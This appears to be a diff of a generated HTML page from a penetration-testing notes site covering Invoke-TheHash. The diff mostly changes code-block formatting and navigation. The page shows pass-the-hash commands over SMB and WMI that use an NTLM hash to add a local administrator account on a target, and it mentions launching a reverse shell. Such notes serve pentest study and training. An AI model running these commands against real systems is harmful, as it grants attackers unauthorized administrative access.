@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17036,19 +17059,23 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="installation">Installation</h2>
 <p>Download Powershell Invoke-TheHash fuctions from github repo:<a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a>. </p>
 <p>When using Invoke-TheHash, we have two options: SMB or WMI command execution.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">tools</span><span class="p">\</span><span class="nb">Invoke-TheHash</span><span class="p">\</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">tools</span><span class="p">\</span><span class="nb">Invoke-TheHash</span><span class="p">\</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="invoke-thehash-with-smb">Invoke-TheHash with SMB</h2>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="nv">$ip</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span> <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="n">-Verbose</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c"># Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c"># we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="nv">$ip</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span> <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="n">-Verbose</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="c"># Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="c"># we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.</span>
+</span></code></pre></div></td></tr></table></div>
 <p><a href="../reverse-shells/">How to generate a reverse shell</a>.</p>
 <h2 id="invoke-thehash-with-wmi">Invoke-TheHash with WMI</h2>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Invoke-WMIExec</span> <span class="n">-Target</span> <span class="nv">$machineName</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span>  <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> 
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="nb">Invoke-WMIExec</span> <span class="n">-Target</span> <span class="nv">$machineName</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span>  <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> 
+</span></code></pre></div></td></tr></table></div>
 <p><a href="../reverse-shells/">How to generate a reverse shell</a>.</p>
 
 <!-- This section adds support for localized revision dates -->
@@ -17125,7 +17152,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
